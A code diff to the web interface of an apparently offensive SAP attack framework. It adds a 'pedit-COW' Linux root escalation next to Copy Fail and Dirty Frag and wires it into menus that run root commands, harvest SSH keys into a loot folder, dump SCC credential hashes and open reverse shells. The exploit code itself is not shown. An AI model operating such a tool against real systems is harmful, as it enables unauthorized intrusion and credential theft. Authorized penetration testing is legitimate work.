@@ -938,7 +938,7 @@ body {
       <div class="ctx-item" data-action="check_cve_6287">&#128270; Check CVE-2020-6287 (RECON)</div>
       <div class="ctx-item" data-action="check_cve_22536">&#128270; Check CVE-2022-22536 (ICMAD smuggle)</div>
       <div class="ctx-item" data-action="wd_rediscover">&#128260; Rediscover WD topology (cache + backends)</div>
-      <div class="ctx-item" data-action="check_linux_lpe">&#128275; Check Linux Root LPE (Copy Fail / Dirty Frag)</div>
+      <div class="ctx-item" data-action="check_linux_lpe">&#128275; Check Linux Root LPE (Copy Fail / pedit-COW / Dirty Frag)</div>
       <div class="ctx-item" data-action="check_windows_lpe">&#128274; Check Windows SYSTEM LPE (auto: EfsPotato / GodPotato / MiniPlasma)</div>
       <div class="ctx-item" data-action="deep_scan">&#128260; Deep Scan (full SAPology)</div>
       <div class="ctx-item" data-action="retrieve_rfcs">&#128225; Retrieve RFC Connections</div>
@@ -956,7 +956,7 @@ body {
     <div class="ctx-item">&#9876; Exploitation</div>
     <div class="ctx-sub">
       <div class="ctx-item" data-action="lpe">&#128274; ABAP Local Privilege Escalation</div>
-      <div class="ctx-item" data-action="exploit_linux_lpe">&#9889; Escalate to Root (pick: Copy Fail [default] / Dirty Frag)</div>
+      <div class="ctx-item" data-action="exploit_linux_lpe">&#9889; Escalate to Root (pick: Copy Fail / pedit-COW / Dirty Frag)</div>
       <div class="ctx-item" data-action="exploit_windows_lpe">&#9889; Escalate to SYSTEM (auto: EfsPotato / GodPotato / MiniPlasma)</div>
       <div class="ctx-item" data-action="betrusted">&#128272; Betrusted — Inject Trusted IP (10KBLAZE)</div>
       <div class="ctx-item" data-action="create_user_betrusted">&#128272; Create User (10KBLAZE Full Chain)</div>
@@ -3397,9 +3397,10 @@ function updateMap() {
         + ` text-anchor="middle" dominant-baseline="middle"`
         + ` font-weight="bold" pointer-events="none">&#9889;</text>`;
     }
-    // Root badge — shown when EITHER Copy Fail or Dirty Frag has
-    // obtained root on this host.
-    if (n.copyfail_root_obtained || n.dirtyfrag_root_obtained) {
+    // Root badge — shown when ANY of the Linux LPE techniques
+    // (Copy Fail / pedit-COW / Dirty Frag) has obtained root.
+    if (n.copyfail_root_obtained || n.dirtyfrag_root_obtained
+        || n.peditcow_root_obtained) {
       html += `<text x="${x+BOX_W-30}" y="${y-2}" font-size="22" fill="#e6edf3"`
            + ` stroke="#0d1117" stroke-width="2.5" paint-order="stroke"`
            + ` text-anchor="middle" dominant-baseline="middle"`
@@ -4179,17 +4180,21 @@ function showCtxMenu(e, sid) {
     'ssh_harvest':      !isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers),
     'ssh_harvest_root': !isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers)
                           && !!(n && (n.copyfail_root_obtained || n.dirtyfrag_root_obtained
-                                       || n.copyfail_vulnerable || n.dirtyfrag_vulnerable)),
+                                       || n.peditcow_root_obtained
+                                       || n.copyfail_vulnerable || n.dirtyfrag_vulnerable
+                                       || n.peditcow_vulnerable)),
     'ssh_test_keys':    !isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers),
     'harvest_scc':          hasGwVuln || hasCve31324 || hasCreatedUsers,
     // LPE-escalating SCC hash dump — needs OS-exec channel AND a
-    // viable Linux LPE (copyfail or dirtyfrag).  Windows targets are
-    // disabled because both LPE techniques are Linux-only.
+    // viable Linux LPE (copyfail / peditcow / dirtyfrag).  Windows
+    // targets are disabled because all three techniques are Linux-only.
     'harvest_scc_hashes_via_lpe': !isWindows
         && (hasGwVuln || hasCve31324 || hasCreatedUsers)
         && (!!n && (n.copyfail_vulnerable || n.dirtyfrag_vulnerable
+                      || n.peditcow_vulnerable
                       || n.copyfail_root_obtained
-                      || n.dirtyfrag_root_obtained)),
+                      || n.dirtyfrag_root_obtained
+                      || n.peditcow_root_obtained)),
     'harvest_scc_mappings': hasGwVuln || hasCve31324 || hasCreatedUsers,
     'harvest_scc_ssfs':     hasGwVuln || hasCve31324 || hasCreatedUsers,
     'scc_via_sap_set_credentials':  true,
@@ -4326,7 +4331,7 @@ function showCtxMenu(e, sid) {
         ? 'Not available on SSH-only pwned hosts — ABAP LPE requires direct ABAP/RFC access.'
         : 'Provide credentials first'),
     'check_linux_lpe':   'Requires OS-exec on Linux host',
-    'exploit_linux_lpe': 'Requires OS-exec on Linux host — run Check first to confirm at least one technique (Copy Fail or Dirty Frag) is viable',
+    'exploit_linux_lpe': 'Requires OS-exec on Linux host — run Check first to confirm at least one technique (Copy Fail / pedit-COW / Dirty Frag) is viable',
     'check_windows_lpe':   'Requires OS-exec on a Windows host (GW SAPXPG, CVE-2025-31324 shell, or SAPMAP-created OS-user)',
     'exploit_windows_lpe': 'Requires OS-exec on Windows host — run Check first to confirm MiniPlasma is viable (Win10 1709+ / Server 2019+ with cldflt.sys + .NET 4.7.2+)',
     'probe_telemetry':  'Needs a verified RFC credential or a SAPMAP-created user — reads runtime profile parameters via TH_GET_PARAMETER (lightweight kernel FM) plus RSAU_PERS for SAL slots. No ABAP install, no AUM/AUW events.',
@@ -4409,14 +4414,14 @@ function showCtxMenu(e, sid) {
     'os_terminal':      'Requires an OS-exec path: vulnerable GW (any stack), ABAP+created-user (SXPG), CVE-2025-31324 webshell (Java), or SSH lateral movement',
     'reverse_shell':    'Requires an OS-exec path: vulnerable GW (any stack), ABAP+created-user (SXPG), or CVE-2025-31324 webshell (Java)',
     'ssh_harvest':      'Requires OS-exec on a Linux host — reads /etc/passwd + .ssh dirs via GW SAPXPG, CVE-2025-31324, or SXPG_STEP_XPG_START',
-    'ssh_harvest_root': 'Requires a viable Linux LPE (Copy Fail or Dirty Frag) — run "Escalate to Root" first. Reads ALL users\' .ssh directories as root.',
+    'ssh_harvest_root': 'Requires a viable Linux LPE (Copy Fail / pedit-COW / Dirty Frag) — run "Escalate to Root" first. Reads ALL users\' .ssh directories as root.',
     'ssh_test_keys':    'Test previously harvested SSH keys against all map nodes — run SSH Harvest first',
     // ssh_plant_key removed (out of scope)
     'harvest_scc':          'Requires OS-exec on this node AND an SCC on the same host IP',
     'harvest_scc_hashes_via_lpe':
         (isWindows
-          ? 'Linux LPE only — Copy Fail / Dirty Frag are Linux techniques; this node is Windows.'
-          : 'Needs OS-exec on this node, a viable Linux LPE (Copy Fail or Dirty Frag), and an SCC on the same host. Run Check Linux Root LPE first.'),
+          ? 'Linux LPE only — Copy Fail / pedit-COW / Dirty Frag are Linux techniques; this node is Windows.'
+          : 'Needs OS-exec on this node, a viable Linux LPE (Copy Fail / pedit-COW / Dirty Frag), and an SCC on the same host. Run Check Linux Root LPE first.'),
     'harvest_scc_mappings': 'Requires OS-exec on this node AND an SCC on the same host IP',
     'create_tcpip':     (!isAbapStack
         ? 'Create TCP/IP Dest is ABAP-only — RFC Type-T destinations + RFC_DESTINATION_INSERT live on the ABAP stack.'
@@ -5318,23 +5323,32 @@ async function ctxAction(action) {
     }
     case 'check_linux_lpe':
       await api('POST', `node/${sid}/check_linux_lpe`);
-      showToast('Linux LPE check started — probing both Copy Fail and Dirty Frag', 'info');
+      showToast('Linux LPE check started — probing Copy Fail, pedit-COW, and Dirty Frag', 'info');
       break;
     case 'exploit_linux_lpe': {
-      // Operator picks technique explicitly. Default is Copy Fail —
-      // it's pure Python (no on-disk binary), fast (~1 RFC call), and
-      // covers most modern kernels. Dirty Frag is the fallback for
-      // kernels where Copy Fail isn't viable; it's a ~7,000-chunk
-      // vendored binary upload over SAPXPG, which is slow and sometimes
-      // hits exec issues on hardened hosts.
-      const usesCopyfail = confirm(
+      // Operator picks technique explicitly. Three options:
+      //   Copy Fail — pure Python (no on-disk binary), fast, ~1 RFC call,
+      //     covers most modern kernels. Recommended default.
+      //   pedit-COW (CVE-2026-46331) — deterministic single-shot,
+      //     ~700 KB vendored static binary. Needs userns enabled
+      //     (frequently disabled on hardened RHEL prod SAP).
+      //   Dirty Frag — race-based fallback, vendored ~7,000-chunk
+      //     binary. Use when neither of the above works.
+      const choice = (prompt(
             'Pick the Linux LPE technique for ' + sid + ':\n\n'
-            + 'OK = Copy Fail (CVE-2026-31431) — pure Python, fast, '
-            + 'no binary on disk. Recommended default.\n\n'
-            + 'Cancel = Dirty Frag (no CVE) — vendored ~7,000-chunk '
-            + 'static binary upload. Use only when Copy Fail is not '
-            + 'viable on this kernel.');
-      const method = usesCopyfail ? 'copyfail' : 'dirtyfrag';
+            + '  copyfail  = Copy Fail (CVE-2026-31431) — pure Python, fast,\n'
+            + '              no binary on disk. Recommended default.\n'
+            + '  peditcow  = pedit-COW (CVE-2026-46331) — deterministic,\n'
+            + '              ~700 KB blob. Needs userns enabled.\n'
+            + '  dirtyfrag = Dirty Frag (no CVE) — vendored ~7,000-chunk\n'
+            + '              binary. Race-based fallback.\n\n'
+            + 'Enter one of: copyfail / peditcow / dirtyfrag',
+            'copyfail') || '').trim().toLowerCase();
+      if (!['copyfail', 'peditcow', 'dirtyfrag'].includes(choice)) {
+        showToast('Cancelled — unknown method ' + JSON.stringify(choice), 'warning');
+        break;
+      }
+      const method = choice;
       const cmd = prompt(
             'Command to run as root on ' + sid
             + ' (via ' + method + '):', 'id');
@@ -6203,17 +6217,19 @@ async function ctxAction(action) {
       const nh = (mapState.nodes || {})[sid];
       const lpeReady = nh && (nh.copyfail_vulnerable
                                 || nh.dirtyfrag_vulnerable
+                                || nh.peditcow_vulnerable
                                 || nh.copyfail_root_obtained
-                                || nh.dirtyfrag_root_obtained);
+                                || nh.dirtyfrag_root_obtained
+                                || nh.peditcow_root_obtained);
       if (!lpeReady) {
         alert('Linux LPE is not flagged viable on ' + sid + '.\n\n'
-              + 'Run "Check Linux Root LPE" first — Copy Fail or '
-              + 'Dirty Frag must report a usable technique before the '
-              + 'escalating harvest can proceed.');
+              + 'Run "Check Linux Root LPE" first — Copy Fail, '
+              + 'pedit-COW, or Dirty Frag must report a usable '
+              + 'technique before the escalating harvest can proceed.');
         break;
       }
       if (!confirm('Escalate to root on ' + sid + ' via Linux LPE '
-                   + '(Copy Fail / Dirty Frag) and read '
+                   + '(Copy Fail / pedit-COW / Dirty Frag) and read '
                    + '/opt/sap/scc/config/users.xml + the rest of the '
                    + 'SCC config bundle?\n\n'
                    + 'This patches /usr/bin/su\'s page cache (memory-only) '
@@ -6304,7 +6320,7 @@ async function ctxAction(action) {
         await api('POST', `node/${sid}/ssh_harvest`);
       break;
     case 'ssh_harvest_root':
-      if (confirm(`Harvest SSH keys from ${sid} as ROOT?\n\nThis uses the Linux LPE (Copy Fail / Dirty Frag) to read ALL users' .ssh directories — not just the current sidadm user.\n\nResults are saved to loot/ssh/.`))
+      if (confirm(`Harvest SSH keys from ${sid} as ROOT?\n\nThis uses the Linux LPE (Copy Fail / pedit-COW / Dirty Frag) to read ALL users' .ssh directories — not just the current sidadm user.\n\nResults are saved to loot/ssh/.`))
         await api('POST', `node/${sid}/ssh_harvest`, { channel: 'root' });
       break;
     case 'ssh_test_keys':
@@ -9546,13 +9562,14 @@ function showTerminalModal(sid) {
        '🔥 NT AUTHORITY\\SYSTEM (via Windows LPE)',
        !hasWinLpe);
   // root via Linux LPE — Linux mirror of winlpe_system.  Gated on
-  // Copy Fail OR Dirty Frag being viable (operator must have run
-  // Check Linux Root LPE first).  The two LPE families are
+  // Copy Fail / pedit-COW / Dirty Frag being viable (operator must
+  // have run Check Linux Root LPE first).  The two LPE families are
   // mutually exclusive in practice (a host is Linux OR Windows);
   // both options stay in the dropdown so the dropdown's structure
   // is OS-independent.
   const hasLinuxLpe = n && (n.copyfail_vulnerable
-                              || n.dirtyfrag_vulnerable);
+                              || n.dirtyfrag_vulnerable
+                              || n.peditcow_vulnerable);
   addT('linuxlpe_root',
        '🔥 root (via Linux LPE)',
        !hasLinuxLpe);
@@ -9590,6 +9607,7 @@ function showTerminalModal(sid) {
   }
   if (hasLinuxLpe) {
     const linuxTech = n.copyfail_vulnerable ? 'Copy Fail'
+                       : n.peditcow_vulnerable ? 'pedit-COW'
                        : 'Dirty Frag';
     info.push('Linux LPE: ' + linuxTech + ' viable (root via Linux LPE menu)');
   }
@@ -9916,7 +9934,8 @@ async function showShellModal(sid) {
   // (server-side: nohup + stdio detach + background subshell so
   // the python3 socket trick survives the wrapper script exit).
   const hasLinuxLpeS = n && (n.copyfail_vulnerable
-                               || n.dirtyfrag_vulnerable);
+                               || n.dirtyfrag_vulnerable
+                               || n.peditcow_vulnerable);
   addS('linuxlpe_root',
        '🔥 root (via Linux LPE)',
        !hasLinuxLpeS);
@@ -9946,6 +9965,7 @@ async function showShellModal(sid) {
   }
   if (hasLinuxLpeS) {
     const linuxTechS = n.copyfail_vulnerable ? 'Copy Fail'
+                        : n.peditcow_vulnerable ? 'pedit-COW'
                         : 'Dirty Frag';
     info.push('Linux LPE: ' + linuxTechS + ' viable - shell will run as root');
   }
